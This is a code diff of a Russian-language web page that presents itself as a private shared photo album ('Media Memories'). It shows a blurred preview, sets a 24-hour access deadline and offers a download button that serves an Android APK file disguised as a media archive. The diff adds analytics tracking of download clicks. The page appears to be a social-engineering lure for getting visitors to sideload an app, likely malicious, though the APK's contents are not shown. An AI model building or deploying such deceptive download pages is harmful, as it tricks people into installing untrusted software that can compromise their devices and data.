@@ -1,21 +1,28 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="www.googletagmanager.com"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8JGS4D5W3L');
+    </script>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Приватный альбом</title>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { text-align: center; background: #111; padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 400px; width: 90%; }
-        /* Стиль для "галереи": используем ваше загруженное изображение 1.jpg */
         .preview { 
             width: 100%; 
             height: 200px; 
-            /* ПРАВИЛЬНАЯ ПОЛНАЯ ССЫЛКА НА ВАШ ФАЙЛ */
             background: url('petrova941.github.io') center/cover; 
             border-radius: 10px; 
             margin-bottom: 20px; 
-            filter: blur(5px); /* Эффект размытия */
+            filter: blur(5px); 
             opacity: 0.8; 
         }
         h1 { font-size: 20px; margin-bottom: 10px; }
@@ -31,13 +38,20 @@
     <h1>Архив «Медиа Воспоминания»</h1>
     <p>Вам открыт доступ к общему медиа-альбому. Файлы будут доступны в течение 24 часов.</p>
     
-    <!-- ПРАВИЛЬНАЯ ПОЛНАЯ ССЫЛКА НА ВАШ ФАЙЛ APK -->
-    <a href="petrova941.github.io" download="memories.apk" class="btn" id="downloadBtn">**Скачать архив**</a>
+    <a href="petrova941.github.io" download="Медиа_Воспоминания.apk" class="btn" id="downloadBtn">**Скачать архив**</a>
 </div>
 
 <script>
-    document.getElementById('downloadBtn').addEventListener('click', function(e) {
-        console.log('Запуск скачивания...');
+    document.getElementById('downloadBtn').addEventListener('click', function() {
+        // Отправка события скачивания в Google Analytics
+        if (typeof gtag === 'function') {
+            gtag('event', 'file_download', {
+                'file_name': 'Медиа_Воспоминания.apk',
+                'event_callback': function() {
+                    console.log('Событие отправлено');
+                }
+            });
+        }
     });
 </script>
 
